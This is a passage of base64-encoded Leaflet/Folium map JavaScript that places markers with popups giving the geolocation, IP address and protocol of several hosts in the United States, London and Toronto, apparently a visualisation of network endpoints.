DA1Yzk4NzMgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYWEzNDljODBiYzUyNDhkY2JmOWYxYTQwMzgxZmQ0Zjkuc2V0SWNvbihpY29uXzg4MGM3YzIzN2RjZjQwMGJhYmEzZmZhMjgwNWM5ODczKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2NmZDA2MmM1YzI2YjRlZTg5YTJiNDQ2OTE3ZTQ4NmM3ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYjM2YjdjYTU4ODgyNGUyN2I2YjU2ZDI2Y2E1MDg2MjQgPSAkKGA8ZGl2IGlkPSJodG1sX2IzNmI3Y2E1ODg4MjRlMjdiNmI1NmQyNmNhNTA4NjI0IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgTG9uZ2l0dWRlPS05Ny44MjIsIExhdGl0dWRlPTM3Ljc1MTxicj4yMC4zOC45OC4xNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2NmZDA2MmM1YzI2YjRlZTg5YTJiNDQ2OTE3ZTQ4NmM3LnNldENvbnRlbnQoaHRtbF9iMzZiN2NhNTg4ODI0ZTI3YjZiNTZkMjZjYTUwODYyNCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2FhMzQ5YzgwYmM1MjQ4ZGNiZjlmMWE0MDM4MWZkNGY5LmJpbmRQb3B1cChwb3B1cF9jZmQwNjJjNWMyNmI0ZWU4OWEyYjQ0NjkxN2U0ODZjNykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYWEzNDljODBiYzUyNDhkY2JmOWYxYTQwMzgxZmQ0ZjkuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTm9uZSwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8xNjdlODk3OWQwYjE0ODM3OGNkNDcyYzQzM2YyM2JjZSA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2Y3MjMyYWQ3N2FmZjQ2MThhNGJhNzgyODhmMmIwYTY1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzE2N2U4OTc5ZDBiMTQ4Mzc4Y2Q0NzJjNDMzZjIzYmNlLnNldEljb24oaWNvbl9mNzIzMmFkNzdhZmY0NjE4YTRiYTc4Mjg4ZjJiMGE2NSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF81NTkxYmYxNDU4OWM0NDY4OTgzNTMzNDNhYzQ5YjNjNiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzcxZWQxYjFlYTcwZjQyYjNiNzgwODJhODhjYTkwM2M4ID0gJChgPGRpdiBpZD0iaHRtbF83MWVkMWIxZWE3MGY0MmIzYjc4MDgyYTg4Y2E5MDNjOCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljg4LjE0OTxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF81NTkxYmYxNDU4OWM0NDY4OTgzNTMzNDNhYzQ5YjNjNi5zZXRDb250ZW50KGh0bWxfNzFlZDFiMWVhNzBmNDJiM2I3ODA4MmE4OGNhOTAzYzgpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8xNjdlODk3OWQwYjE0ODM3OGNkNDcyYzQzM2YyM2JjZS5iaW5kUG9wdXAocG9wdXBfNTU5MWJmMTQ1ODljNDQ2ODk4MzUzMzQzYWM0OWIzYzYpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzE2N2U4OTc5ZDBiMTQ4Mzc4Y2Q0NzJjNDMzZjIzYmNlLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl84Yzg1MzdkNTNlYzE0YWJlYWMzODFjOWJjZjE1ODA3OCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9mYTBmZjU2MDJkYjg0MmI1YWYwY2I3MmFiYWU1ZGY1OCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl84Yzg1MzdkNTNlYzE0YWJlYWMzODFjOWJjZjE1ODA3OC5zZXRJY29uKGljb25fZmEwZmY1NjAyZGI4NDJiNWFmMGNiNzJhYmFlNWRmNTgpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYmU4NTdlNTc5NGJkNDBjM2JmZjEwMDdkZGQ0NGVlMDUgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8zZjRiYmVhN2Y5OTc0ZDhhYTE1YWM0OGQ2YzlmZWQwZiA9ICQoYDxkaXYgaWQ9Imh0bWxfM2Y0YmJlYTdmOTk3NGQ4YWExNWFjNDhkNmM5ZmVkMGYiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC42NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYmU4NTdlNTc5NGJkNDBjM2JmZjEwMDdkZGQ0NGVlMDUuc2V0Q29udGVudChodG1sXzNmNGJiZWE3Zjk5NzRkOGFhMTVhYzQ4ZDZjOWZlZDBmKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfOGM4NTM3ZDUzZWMxNGFiZWFjMzgxYzliY2YxNTgwNzguYmluZFBvcHVwKHBvcHVwX2JlODU3ZTU3OTRiZDQwYzNiZmYxMDA3ZGRkNDRlZTA1KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl84Yzg1MzdkNTNlYzE0YWJlYWMzODFjOWJjZjE1ODA3OC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzMyNGE5NDA4OTdhMTQ0NjFiODRlZThiYzkzNmZmM2I2ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzk5ODZmODIxYWNhZDQ3MDNhNjM0NzkwODYxZWViNmY1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzMyNGE5NDA4OTdhMTQ0NjFiODRlZThiYzkzNmZmM2I2LnNldEljb24oaWNvbl85OTg2ZjgyMWFjYWQ0NzAzYTYzNDc5MDg2MWVlYjZmNSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9iNmI3ZTJkMzY1MmU0NWZiOGE3Mzg1NDViMTYzNDUyYiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzYxZmNlZGY4MjY4ODQ3ZTZiZDZjNjY5YmE2ZmE5N2FjID0gJChgPGRpdiBpZD0iaHRtbF82MWZjZWRmODI2ODg0N2U2YmQ2YzY2OWJhNmZhOTdhYyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4xNjguNTAuNzk8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYjZiN2UyZDM2NTJlNDVmYjhhNzM4NTQ1YjE2MzQ1MmIuc2V0Q29udGVudChodG1sXzYxZmNlZGY4MjY4ODQ3ZTZiZDZjNjY5YmE2ZmE5N2FjKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMzI0YTk0MDg5N2ExNDQ2MWI4NGVlOGJjOTM2ZmYzYjYuYmluZFBvcHVwKHBvcHVwX2I2YjdlMmQzNjUyZTQ1ZmI4YTczODU0NWIxNjM0NTJiKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8zMjRhOTQwODk3YTE0NDYxYjg0ZWU4YmM5MzZmZjNiNi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMDQ3MjViZjYzYTY1NDlhMmE4M2UwNzQxNGEzMjg0ZjcgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZGQ2NzYwOTgyODhjNDkxY2EzZGQxNzE2ZDc5Y2Y5YTkgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMDQ3MjViZjYzYTY1NDlhMmE4M2UwNzQxNGEzMjg0Zjcuc2V0SWNvbihpY29uX2RkNjc2MDk4Mjg4YzQ5MWNhM2RkMTcxNmQ3OWNmOWE5KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2U3NTAwMzQxNTYzODQwNjViMjg0MGI2MDdkMGM0MzBhID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYWZkNDJiZGQwYjAyNGUxNDlmYTg1NmMyOGNmOTJhYTQgPSAkKGA8ZGl2IGlkPSJodG1sX2FmZDQyYmRkMGIwMjRlMTQ5ZmE4NTZjMjhjZjkyYWE0IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjE2OC41MC43OTxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9lNzUwMDM0MTU2Mzg0MDY1YjI4NDBiNjA3ZDBjNDMwYS5zZXRDb250ZW50KGh0bWxfYWZkNDJiZGQwYjAyNGUxNDlmYTg1NmMyOGNmOTJhYTQpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8wNDcyNWJmNjNhNjU0OWEyYTgzZTA3NDE0YTMyODRmNy5iaW5kUG9wdXAocG9wdXBfZTc1MDAzNDE1NjM4NDA2NWIyODQwYjYwN2QwYzQzMGEpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzA0NzI1YmY2M2E2NTQ5YTJhODNlMDc0MTRhMzI4NGY3LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8wNDY4OGYzYzQwZTM0N2VkOTdlMzQzYjY3YWJlMjI5NiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9mZTgxMTU3NjZlZjg0ZDkxODAyMjU2NjgyYWU0OTU2ZSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8wNDY4OGYzYzQwZTM0N2VkOTdlMzQzYjY3YWJlMjI5Ni5zZXRJY29uKGljb25fZmU4MTE1NzY2ZWY4NGQ5MTgwMjI1NjY4MmFlNDk1NmUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZDMwNDJmNDhjYzEyNDcwNGExYWQ0ZTA5YzBiMDZhM2MgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF84NWQ2NWJiZDIxNDA0ZjU1YmZiNGU3NTgxYzYxYmM2NSA9ICQoYDxkaXYgaWQ9Imh0bWxfODVkNjViYmQyMTQwNGY1NWJmYjRlNzU4MWM2MWJjNjUiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMTY4LjUwLjc5PGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2QzMDQyZjQ4Y2MxMjQ3MDRhMWFkNGUwOWMwYjA2YTNjLnNldENvbnRlbnQoaHRtbF84NWQ2NWJiZDIxNDA0ZjU1YmZiNGU3NTgxYzYxYmM2NSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzA0Njg4ZjNjNDBlMzQ3ZWQ5N2UzNDNiNjdhYmUyMjk2LmJpbmRQb3B1cChwb3B1cF9kMzA0MmY0OGNjMTI0NzA0YTFhZDRlMDljMGIwNmEzYykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMDQ2ODhmM2M0MGUzNDdlZDk3ZTM0M2I2N2FiZTIyOTYuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2ZjZWFkMTI0NGIwNTQxYTM5MGRmYWVhZjQ4NDY4OGU0ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszNy43NTEsIC05Ny44MjJdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl83NzBjMzIyYWU4MmM0MmNlOTFmZGI2OGI0MGFmNzE5MCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9mY2VhZDEyNDRiMDU0MWEzOTBkZmFlYWY0ODQ2ODhlNC5zZXRJY29uKGljb25fNzcwYzMyMmFlODJjNDJjZTkxZmRiNjhiNDBhZjcxOTApOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfM2Y1ZjEyMTA5NDA2NGJjNWEyNTdlNTNkNGQzYzJjYTggPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9kNmE0NDFmYjFmZTU0YTRhYmFlYjkwMzViMzI1NmZhYyA9ICQoYDxkaXYgaWQ9Imh0bWxfZDZhNDQxZmIxZmU1NGE0YWJhZWI5MDM1YjMyNTZmYWMiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBMb25naXR1ZGU9LTk3LjgyMiwgTGF0aXR1ZGU9MzcuNzUxPGJyPjIwLjM4Ljk4LjE2NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfM2Y1ZjEyMTA5NDA2NGJjNWEyNTdlNTNkNGQzYzJjYTguc2V0Q29udGVudChodG1sX2Q2YTQ0MWZiMWZlNTRhNGFiYWViOTAzNWIzMjU2ZmFjKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfZmNlYWQxMjQ0YjA1NDFhMzkwZGZhZWFmNDg0Njg4ZTQuYmluZFBvcHVwKHBvcHVwXzNmNWYxMjEwOTQwNjRiYzVhMjU3ZTUzZDRkM2MyY2E4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9mY2VhZDEyNDRiMDU0MWEzOTBkZmFlYWY0ODQ2ODhlNC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBOb25lLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2Q2MGY0OTI1ZjM3MzQ4MmVhNzIzMGQ5MmNiMmQ5MjljID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2EzMmVhMDFiOWQzOTQwMDY5YWJlZjMwYjUzMDdiNTU5ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2Q2MGY0OTI1ZjM3MzQ4MmVhNzIzMGQ5MmNiMmQ5MjljLnNldEljb24oaWNvbl9hMzJlYTAxYjlkMzk0MDA2OWFiZWYzMGI1MzA3YjU1OSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8yMWM4YjI5N2I4MWM0M2QxODdjZWYwOTM2YmM2ODU3YyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzEwZDNmNWE4NWYyODQ2OTI5ODdmODE2MjEwOGRhY2YwID0gJChgPGRpdiBpZD0iaHRtbF8xMGQzZjVhODVmMjg0NjkyOTg3ZjgxNjIxMDhkYWNmMCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEzMDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMjFjOGIyOTdiODFjNDNkMTg3Y2VmMDkzNmJjNjg1N2Muc2V0Q29udGVudChodG1sXzEwZDNmNWE4NWYyODQ2OTI5ODdmODE2MjEwOGRhY2YwKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfZDYwZjQ5MjVmMzczNDgyZWE3MjMwZDkyY2IyZDkyOWMuYmluZFBvcHVwKHBvcHVwXzIxYzhiMjk3YjgxYzQzZDE4N2NlZjA5MzZiYzY4NTdjKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9kNjBmNDkyNWYzNzM0ODJlYTcyMzBkOTJjYjJkOTI5Yy5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMzg4NzgyOTY5NWQ3NDkzYzlkOTJhYTI2Nz